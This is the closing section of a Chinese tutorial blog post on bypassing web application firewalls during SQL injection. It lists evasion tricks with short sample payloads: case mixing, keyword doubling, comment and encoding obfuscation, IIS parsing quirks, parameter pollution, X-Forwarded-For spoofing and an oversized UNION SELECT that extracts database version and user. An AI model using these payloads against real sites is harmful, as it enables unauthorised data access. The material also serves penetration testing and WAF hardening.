+</code></pre><p>其他的自己探索吧，bypass 也就一个知识量和思路的结合</p><p><img data-src="2.5.2.png" alt="mysql"></p><h1 id="0x00-拓展bypass的常用思路"><a class="anchor" href="#0x00-拓展bypass的常用思路">#</a> 0x00 拓展 Bypass 的常用思路</h1><p>WAF 的绕过我们无非就是利用 WEB 程序缺陷，容器特性，网络协议，数据库特性来组合利用绕过，从用户发出请求到数据库的每一点，寻找突破口。</p><h1 id="0x01-常见的手段"><a class="anchor" href="#0x01-常见的手段">#</a> 0x01 常见的手段</h1><ol><li><p>HTTP 协议</p></li><li><p>大小混写</p></li><li><p>替换</p></li><li><p>使用特殊字符</p></li><li><p>使用编码</p></li><li><p>等价替换</p></li><li><p>容器特性</p></li><li><p>白名单</p></li><li><p>缓冲溢出</p></li></ol><p>等等</p><h2 id="http协议"><a class="anchor" href="#http协议">#</a> HTTP 协议</h2><p>HTTP 协议中有很多功能，一般来说我们可以用到的就是编码功能，后来有大佬发现了分块传入来绕过 WAF，具体大家可以百度看看，大概 http 协议我们可以总结如下。</p><ol><li><p>构造畸形数据包</p></li><li><p>编码</p></li><li><p>分块</p></li><li><p>数据包溢出</p></li></ol><p>可能有些表述有误，但是大概意思如此，构造畸形数据包的原理是 http 协议是有一定的容错性的，我们也常用这个容错性去绕过上传。编码绕过的原理也是利用程序解密，而 waf 识别不了，数据包溢出则是数据包过大 waf 自动丢弃不识别</p><h2 id="大小混写"><a class="anchor" href="#大小混写">#</a> 大小混写</h2><p>大小混写一般是绕过一些简单的正则 ，对大小写敏感的。</p><pre><code>UnIon SlEct 
+
+</code></pre><h2 id="替换"><a class="anchor" href="#替换">#</a> 替换</h2><p>这种一般是因为正则吧我们的关键词给替换删除了，但是没有进行多次匹配导致绕过</p><pre><code>ununionion seselectlect
+
+un/**/ion se/**/lect
+
+</code></pre><h2 id="特殊字符"><a class="anchor" href="#特殊字符">#</a> 特殊字符</h2><p>特殊符号也多是数据库的特性，利用数据库可以使用多种符号来绕过，多种的运算符</p><pre><code>`updatexml`
+
+and!!!1=1
+
+/**/
+
+/*!50000*/
+
+</code></pre><h2 id="使用编码"><a class="anchor" href="#使用编码">#</a> 使用编码</h2><p>这里和 http 协议差不多，多重编码等等，url 编码会自己解码一次，但是有的程序他可以自己多次解密，那么我们就可以拿来利用<br>还有的程序参数他是支持 base64 的 那么我们的 payload 就可以编码绕过了</p><pre><code>= -&gt; %3D -&gt;%25%33%44
+
+and 1=1 -&gt; YW5kIDE9MQ==
+
+</code></pre><h2 id="等价替换"><a class="anchor" href="#等价替换">#</a> 等价替换</h2><p>mysql 众多的函数也我们的 bypass 带来了很对便利，比如一个分割字符串的函数都是几个，倘若被过滤一个可以换成其他的</p><pre><code>substr(version(),1,1)
+Substring(version(),1,1)
+Left(version(),1)
+
+</code></pre><h2 id="容器特性"><a class="anchor" href="#容器特性">#</a> 容器特性</h2><ol><li>iis</li></ol><p>容器的特性给我们绕过非常的有帮助，感谢那些善于发现的师傅们。</p><pre><code>iis+asp 的%特性：当传入的 s%e%l%e%c%t 函数被%分割时，解析出来还是select
+iis+asp 的unicode特性 ： iis支持Unicode的解析 我们传入s%u0065lect解析为select
+
+    +--------------------------------------------------------------------+
+    |   Keywords     |        WAF             |  ASP/ASP.NET             |
+    +--------------------------------------------------------------------+
+    | sele%ct * fr%om..  | sele%ct * fr%om..      | select * from..      |
+    | ;dr%op ta%ble xxx  | ;dr%op ta%ble xxx      | ;drop table xxx      |
+    | &lt;scr%ipt&gt;      | &lt;scr%ipt&gt;                  | &lt;script&gt;             |
+    | &lt;if%rame&gt;      | &lt;if%rame&gt;                  | &lt;iframe&gt;             |
+    +--------------------------------------------------------------------+
+
+</code></pre><ol start="2"><li>hpp</li></ol><p>hpp 参数污染，前面我们绕过安全狗用到过，不同容器对我们传入的值解析顺序不同，这也是我们可以利用的</p><pre><code>    php+apache    &amp;id=1&amp;id=2     他只解析最后一个
+
+
+    +------------------------------------------------------------------+
+    | Web Server      | Parameter Interpretation         | Example     |
+    +------------------------------------------------------------------+
+    | ASP.NET/IIS     | Concatenation by comma       | par1=val1,val2  |
+    | ASP/IIS         | Concatenation by comma       | par1=val1,val2  |
+    | PHP/Apache      | The last param is resulting  | par1=val2       |
+    | JSP/Tomcat      | The first param is resulting | par1=val1       |
+    | Perl/Apache     | The first param is resulting | par1=val1       |
+    | DBMan           | Concatenation by two tildes  | par1=val1~~val2 |
+    +------------------------------------------------------------------+
+
+</code></pre><ol start="3"><li>HTTP Parameter Contamination</li></ol><p>不同的容器他会对我们的参数带入的一些特殊字符解析成不同的东西，比如</p><pre><code>    +-----------------------------------------------------------+
+    | Query String    |    Web Servers response / GET values    |
+    +-----------------------------------------------------------+
+    |         | Apache/2.2.16, PHP/5.3.3 | IIS6/ASP             |
+    +-----------------------------------------------------------+
+    | ?test[1=2       | test_1=2             | test[1=2         |
+    | ?test=%         | test=%               | test=            |
+    | ?test%00=1      | test=1               | test=1           |
+    | ?test=1%001     | NULL                 | test=1           |
+    | ?test+d=1+2     | test_d=1 2           | test d=1 2       |
+    +-----------------------------------------------------------+
+
+</code></pre><h2 id="白名单"><a class="anchor" href="#白名单">#</a> 白名单</h2><p>有的程序他会对本地 ip 不拦截，同时他的 host 使用 <code>X-Forwarded-For</code> 等来获取</p><pre><code>X-Forwarded-For:127.0.0.1
+
+</code></pre><h2 id="缓冲溢出"><a class="anchor" href="#缓冲溢出">#</a> 缓冲溢出</h2><p>waf 他处理数据包的大小有限，早期安全狗你提交过长 url 会直接奔溃</p><pre><code>?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
+
+</code></pre><h2 id="参考文章"><a class="anchor" href="#参考文章">#</a> 参考文章</h2><ol><li><p>Obfuscate and Bypass ： <span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vcGFwZXJzLzE3OTM0">https://www.exploit-db.com/papers/17934</span></p></li><li><p>9 ways to bypass Web Application Firewall：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGlnaXRhbG11bml0aW9uLm1lLzIwMTgvMDIvc3FsLWluamVjdGlvbi05LXdheXMtYnlwYXNzLXdlYi1hcHBsaWNhdGlvbi1maXJld2FsbC8=">https://www.digitalmunition.me/2018/02/sql-injection-9-ways-bypass-web-application-firewall/</span></p></li></ol><h1 id="0x02-文末-4"><a class="anchor" href="#0x02-文末-4">#</a> 0x02 文末</h1><p>bypass 不要局限与一种，多种组合才能最大利用，你需要了解 mysql 的语法，特殊的符号，特殊的写法，FUZZ 他可以容错的地方</p><div class="tags"><a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"><i class="ic i-tag"></i> sql注入</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2021-01-20 15:07:05" itemprop="dateModified" datetime="2021-01-20T15:07:05+08:00">2021-01-20</time> </span><span id="再学SQLinjection/" class="item leancloud_visitors" data-flag-title="再学SQLinjection" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div class="reward"><button><i class="ic i-heartbeat"></i> 赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img data-src="/images/reward.jpg" alt="Or0kit 支付宝"><p>支付宝</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>Or0kit <i class="ic i-at"><em>@</em></i>Be malicious</li><li class="link"><strong>本文链接：</strong> <a href="https://self-ferry.github.io/%E5%86%8D%E5%AD%A6SQLinjection/" title="再学SQLinjection">https://self-ferry.github.io/再学SQLinjection/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/Python%E4%B8%ADread-%E3%80%81readline-%E5%92%8Creadlines-%E4%B8%89%E8%80%85%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E5%92%8C%E7%94%A8%E6%B3%95/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclhpw3lwj20zk0m8gvw.jpg" title="Python中read()、readline()和readlines()三者间的区别和用法"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> python</span><h3>Python中read()、readline()和readlines()三者间的区别和用法</h3></a></div><div class="item right"><a href="/%E5%88%9D%E5%AD%A6XSS/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giciryrr3rj20zk0m8nhk.jpg" title="初学XSS"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> web安全</span><h3>初学XSS</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E6%B3%A8%E5%85%A5%E7%9A%84%E4%BA%A7%E7%94%9F"><span class="toc-number">2.</span> <span class="toc-text">0x00 注入的产生</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E6%B3%A8%E5%85%A5%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-number">3.</span> <span class="toc-text">0x01 注入的类型</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E4%BA%9B%E6%B3%A8%E6%84%8F"><span class="toc-number">4.</span> <span class="toc-text">0x03 寻找注入的一些注意</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%88%E6%9C%AC%E6%94%B6%E9%9B%86%E4%B8%8E%E8%B7%AF%E5%BE%84"><span class="toc-number">5.</span> <span class="toc-text">0x00 数据库版本收集与路径</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E7%94%A8%E6%88%B7%E9%93%BE%E6%8E%A5%E4%BF%A1%E6%81%AF"><span class="toc-number">6.</span> <span class="toc-text">0x01 用户，链接信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E6%96%87%E6%9C%AB"><span class="toc-number">7.</span> <span class="toc-text">0x02 文末</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E5%88%9D%E8%AF%86%E6%B3%A8%E5%85%A5-bypass"><span class="toc-number">8.</span> <span class="toc-text">0x00 初识注入 bypass</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E7%AC%AC%E4%B8%80%E4%B8%AA%E6%B3%A8%E5%85%A5"><span class="toc-number">9.</span> <span class="toc-text">0x01 第一个注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">10.</span> <span class="toc-text">0x00 报错注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E7%9B%B2%E6%B3%A8"><span class="toc-number">11.</span> <span class="toc-text">0x00 盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E7%9B%B2%E6%B3%A8%E4%B8%AD%E5%80%BC%E5%BE%97%E6%B3%A8%E6%84%8F%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">12.</span> <span class="toc-text">0x01 盲注中值得注意的问题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E7%AE%80%E5%8D%95%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">13.</span> <span class="toc-text">0x02 简单时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#if"><span class="toc-number">13.1.</span> <span class="toc-text">if()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#case-when-then-else-end"><span class="toc-number">13.2.</span> <span class="toc-text">case when then else end</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">14.</span> <span class="toc-text">0x03 布尔盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E5%B0%8F%E6%8A%80%E5%B7%A7"><span class="toc-number">15.</span> <span class="toc-text">0x04 小技巧</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-insertdeleteupdate-%E6%B3%A8%E5%85%A5"><span class="toc-number">16.</span> <span class="toc-text">0x00 insert,delete,update 注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-insertdeleteupdate"><span class="toc-number">17.</span> <span class="toc-text">0x01 insert,delete,update</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#insert"><span class="toc-number">17.1.</span> <span class="toc-text">insert</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#delete"><span class="toc-number">17.2.</span> <span class="toc-text">delete</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#update"><span class="toc-number">17.3.</span> <span class="toc-text">update</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E6%96%87%E6%9C%AB-2"><span class="toc-number">18.</span> <span class="toc-text">0x02 文末</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">19.</span> <span class="toc-text">0x00 二次注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">20.</span> <span class="toc-text">0x01 宽字节注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-order-by-%E6%B3%A8%E5%85%A5"><span class="toc-number">21.</span> <span class="toc-text">0x00 order by 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">21.1.</span> <span class="toc-text">盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">21.2.</span> <span class="toc-text">报错注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-from"><span class="toc-number">22.</span> <span class="toc-text">0x01 From</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-limit"><span class="toc-number">23.</span> <span class="toc-text">0x02 limit</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E5%86%8D%E8%B0%88%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%99%BB%E9%99%86"><span class="toc-number">24.</span> <span class="toc-text">0x00 再谈万能密码登陆</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6%E4%B8%8E%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2"><span class="toc-number">25.</span> <span class="toc-text">0x00 读写文件与堆叠查询</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-number">26.</span> <span class="toc-text">0x01 读文件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">27.</span> <span class="toc-text">0x02 写文件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2"><span class="toc-number">28.</span> <span class="toc-text">0x03 堆叠查询</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E8%BF%87%E7%8B%97"><span class="toc-number">29.</span> <span class="toc-text">0x00 联合注入过狗</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E6%8E%A2%E7%B4%A2-and"><span class="toc-number">30.</span> <span class="toc-text">0x01 探索 and</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E6%8E%A2%E7%B4%A2-union-select"><span class="toc-number">31.</span> <span class="toc-text">0x02 探索 union select</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E6%B3%A8%E5%85%A5"><span class="toc-number">32.</span> <span class="toc-text">0x03 注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E6%96%87%E6%9C%AB"><span class="toc-number">33.</span> <span class="toc-text">0x04 文末</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E5%BB%B6%E6%97%B6%E8%BF%87%E7%8B%97"><span class="toc-number">34.</span> <span class="toc-text">0x00 延时过狗</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%B8%83%E5%B0%94%E8%BF%87%E7%8B%97"><span class="toc-number">35.</span> <span class="toc-text">0x01 布尔过狗</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E6%96%87%E6%9C%AB-3"><span class="toc-number">36.</span> <span class="toc-text">0x02 文末</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E6%8E%A2%E7%B4%A2%E6%8A%A5%E9%94%99"><span class="toc-number">37.</span> <span class="toc-text">0x00 探索报错</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E6%96%87%E6%9C%AB"><span class="toc-number">38.</span> <span class="toc-text">0x01 文末</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E7%9F%9B%E4%B8%8E%E4%BA%91%E7%9B%BE%E8%BF%87%E7%8B%97"><span class="toc-number">39.</span> <span class="toc-text">0x00 矛与云盾过狗</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E6%B3%A8%E5%85%A5"><span class="toc-number">40.</span> <span class="toc-text">0x01 注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%88%91%E4%B8%8E%E4%BA%91%E9%94%81%E6%9C%89%E4%B8%AA%E7%BA%A6%E4%BC%9A"><span class="toc-number">41.</span> <span class="toc-text">我与云锁有个约会</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E7%AE%80%E5%8D%95and%E6%8E%A2%E7%B4%A2"><span class="toc-number">41.1.</span> <span class="toc-text">0x00 简单 and 探索</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%88%91%E4%B8%8E%E4%BA%91%E9%94%81%E6%9C%89%E4%B8%AA%E7%BA%A6%E4%BC%9A"><span class="toc-number">41.2.</span> <span class="toc-text">0x01 我与云锁有个约会</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E6%8B%93%E5%B1%95bypass%E7%9A%84%E5%B8%B8%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">42.</span> <span class="toc-text">0x00 拓展 Bypass 的常用思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%B8%B8%E8%A7%81%E7%9A%84%E6%89%8B%E6%AE%B5"><span class="toc-number">43.</span> <span class="toc-text">0x01 常见的手段</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#http%E5%8D%8F%E8%AE%AE"><span class="toc-number">43.1.</span> <span class="toc-text">HTTP 协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E6%B7%B7%E5%86%99"><span class="toc-number">43.2.</span> <span class="toc-text">大小混写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9B%BF%E6%8D%A2"><span class="toc-number">43.3.</span> <span class="toc-text">替换</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6"><span class="toc-number">43.4.</span> <span class="toc-text">特殊字符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E7%BC%96%E7%A0%81"><span class="toc-number">43.5.</span> <span class="toc-text">使用编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2"><span class="toc-number">43.6.</span> <span class="toc-text">等价替换</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%B9%E5%99%A8%E7%89%B9%E6%80%A7"><span class="toc-number">43.7.</span> <span class="toc-text">容器特性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BD%E5%90%8D%E5%8D%95"><span class="toc-number">43.8.</span> <span class="toc-text">白名单</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%93%E5%86%B2%E6%BA%A2%E5%87%BA"><span class="toc-number">43.9.</span> <span class="toc-text">缓冲溢出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">43.10.</span> <span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E6%96%87%E6%9C%AB-4"><span class="toc-number">44.</span> <span class="toc-text">0x02 文末</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/%E5%88%9D%E5%AD%A6SQLinjection/" rel="bookmark" title="初学SQLinjection">初学SQLinjection</a></li><li><a href="/SQLMAP%E6%80%BB%E7%BB%93/" rel="bookmark" title="SQLMAP总结">SQLMAP总结</a></li><li class="active"><a href="/%E5%86%8D%E5%AD%A6SQLinjection/" rel="bookmark" title="再学SQLinjection">再学SQLinjection</a></li><li><a href="/%E5%88%9D%E5%AD%A6XSS/" rel="bookmark" title="初学XSS">初学XSS</a></li><li><a href="/SQL-injection-payload-list/" rel="bookmark" title="SQL-injection-payload-list【转】">SQL-injection-payload-list【转】</a></li><li><a href="/web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="bookmark" title="web漏洞-文件上传">web漏洞-文件上传</a></li><li><a href="/awesome-web-security/" rel="bookmark" title="Awesome Web Security【转】">Awesome Web Security【转】</a></li><li><a href="/web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="bookmark" title="web漏洞-文件包含">web漏洞-文件包含</a></li><li><a href="/web%E6%BC%8F%E6%B4%9E-CSRF/" rel="bookmark" title="web漏洞-CSRF">web漏洞-CSRF</a></li><li><a href="/web%E6%BC%8F%E6%B4%9E-SSRF/" rel="bookmark" title="web漏洞-SSRF">web漏洞-SSRF</a></li><li><a href="/Nmap%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/" rel="bookmark" title="Nmap速查手册">Nmap速查手册</a></li><li><a href="/web%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" rel="bookmark" title="web漏洞-业务逻辑漏洞">web漏洞-业务逻辑漏洞</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="Or0kit" data-src="/images/avatar.jpg"><p class="name" itemprop="name">Or0kit</p><div class="description" itemprop="description">临渊羡鱼，不如退而结网</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">79</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">21</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">93</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NlbGYtZmVycnk=" title="https:&#x2F;&#x2F;github.com&#x2F;self-ferry"><i class="ic i-github"></i></span> <span class="exturl item twitter" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS95b3VybmFtZQ==" title="https:&#x2F;&#x2F;twitter.com&#x2F;yourname"><i class="ic i-twitter"></i></span> <span class="exturl item zhihu" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3Blb3BsZS95b3VybmFtZQ==" title="https:&#x2F;&#x2F;www.zhihu.com&#x2F;people&#x2F;yourname"><i class="ic i-zhihu"></i></span> <span class="exturl item music" data-url="aHR0cHM6Ly9tdXNpYy4xNjMuY29tLyMvdXNlci9ob21lP2lkPXlvdXJuYW1l" title="https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;yourname"><i class="ic i-cloud-music"></i></span> <span class="exturl item weibo" data-url="aHR0cHM6Ly93ZWliby5jb20veW91cm5hbWU=" title="https:&#x2F;&#x2F;weibo.com&#x2F;yourname"><i class="ic i-weibo"></i></span> <span class="exturl item about" data-url="aHR0cHM6Ly9hYm91dC5tZS9zZWxmLWZlcnJ5" title="https:&#x2F;&#x2F;about.me&#x2F;self-ferry"><i class="ic i-address-card"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li><li class="item"><a href="/links/" rel="section"><i class="ic i-magic"></i>links</a></li></ul></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/Python%E4%B8%ADread-%E3%80%81readline-%E5%92%8Creadlines-%E4%B8%89%E8%80%85%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E5%92%8C%E7%94%A8%E6%B3%95/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/%E5%88%9D%E5%AD%A6XSS/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/python/" title="分类于 python">python</a></div><span><a href="/python-%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/" title="python 期末复习">python 期末复习</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/mysql/" title="分类于 mysql">mysql</a></div><span><a href="/get%E4%B8%80%E4%B8%AAmysql%E7%9F%A5%E8%AF%86/" title="get一个mysql知识">get一个mysql知识</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CobaltStrike/" title="分类于 CobaltStrike">CobaltStrike</a></div><span><a href="/CobaltStrike%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97%E7%9A%84%E4%BD%BF%E7%94%A8/" title="CobaltStrike攻击模块的使用">CobaltStrike攻击模块的使用</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Win32/" title="分类于 Win32">Win32</a></div><span><a href="/Win%E6%B6%88%E6%81%AF%E6%9C%BA%E5%88%B6%E5%92%8C%E6%B6%88%E6%81%AF%E7%B1%BB%E5%9E%8B/" title="Win消息机制和消息类型">Win消息机制和消息类型</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Win32/" title="分类于 Win32">Win32</a></div><span><a href="/Win%E4%BA%92%E6%96%A5%E4%BD%93/" title="Win互斥体">Win互斥体</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="分类于 网络安全">网络安全</a></div><span><a href="/RedTeamer/" title="红方人员实战手册【转】">红方人员实战手册【转】</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Linux/" title="分类于 Linux">Linux</a></div><span><a href="/Linux%E9%85%8D%E7%BD%AENginx%E6%9C%8D%E5%8A%A1/" title="Linux配置Nginx服务">Linux配置Nginx服务</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/WindowsPE/" title="分类于 WindowsPE">WindowsPE</a></div><span><a href="/%E6%96%B0%E5%A2%9E%E8%8A%82/" title="新增节">新增节</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/WindowsPE/" title="分类于 WindowsPE">WindowsPE</a></div><span><a href="/%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8/" title="重定位表">重定位表</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Win32/" title="分类于 Win32">Win32</a></div><span><a href="/Win%E4%B8%B4%E7%95%8C%E5%8C%BA/" title="Win临界区">Win临界区</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 – <span itemprop="copyrightYear">2021</span> <span class="with-love"><i class="ic i-sakura 